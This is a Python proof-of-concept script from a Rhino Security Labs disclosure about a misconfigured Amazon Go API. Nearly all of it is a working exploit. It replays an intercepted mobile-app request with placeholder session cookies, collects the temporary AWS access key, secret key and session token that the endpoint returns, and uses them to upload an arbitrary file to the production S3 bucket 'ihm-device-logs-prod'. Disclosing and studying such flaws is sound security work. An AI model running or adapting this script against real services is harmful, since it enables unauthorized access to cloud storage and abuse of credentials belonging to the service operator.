
########
#https://rhinosecuritylabs.com/aws/amazon-aws-misconfiguration-amazon-go/
# Spencer Gietzen - Rhino Security Labs
# Amazon’s AWS Misconfiguration: Arbitrary Files Upload in Amazon Go blog post: https://rhinosecuritylabs.com/aws/amazon-aws-misconfiguration-amazon-go/
#
# This script was used to retrieve an AWS access key, secret key, and session token from the Amazon Go
# getUploadCredentialsV2 API endpoint and then quickly use them to upload an arbitrary file to the
# Amazon Go log bucket "ihm-device-logs-prod"
#
# The values that have been replaced below were retrieved by intercepting HTTP requests that the
# Amazon Go mobile application was making
#
########
import json, boto3, requests

# Make the request to getUploadCredentialsV2 which will return the AWS access key, secret key, and session token
response = requests.post('https://mccs.amazon.com/ihmfence',
    headers={
        'Accept': 'application/json',
        'x-amz-access-token': 'my-x-amz-access-token',
        'Content-Encoding': 'amz-1.0',
        'X-Amz-DevicePlatform': 'ios',
        'X-Amz-AppBuild': '4000022',
        'Accept-Language': 'en-us',
        'X-Amz-DeviceId': 'my-device-id',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/json',
        'User-Agent': 'Amazon Go/4000022 CFNetwork/808.0.2 Darwin/16.0.0',
        'Connection': 'close',
        'X-Amz-DevicePlatformVersion': '10.0.2',
        'X-Amz-Target': 'com.amazon.ihmfence.coral.IhmFenceService.getUploadCredentialsV2',
        'X-Amzn-AppVersion': '1.0.0'
    },
    cookies={
        'ubid-tacbus': 'my-ubid-tacbus',
        'session-token': 'my-session-token',
        'at-tacbus': 'my-at-tacbus',
        'session-id': 'my-session-id',
        'session-id-time': 'some-time'
    },
    # Send an empty JSON object as the body
    data='{}'
)

# Store the values returned in the response
obj = response.json()
print(obj)
access_key = obj['accessKey']
secret_key = obj['secretKey']
session_token = obj['sessionToken']

# Create an S3 boto3 resource
s3 = boto3.resource(
    's3',
    aws_access_key_id=access_key,
    aws_secret_access_key=secret_key,
    aws_session_token=session_token,
    region_name='us-west-2'
)

# Upload my local ./test.txt file to ihm-device-logs-prod with the name test.txt
upload = s3.meta.client.upload_file('./test.txt', 'ihm-device-logs-prod', 'test.txt')

# Print the results
print(upload)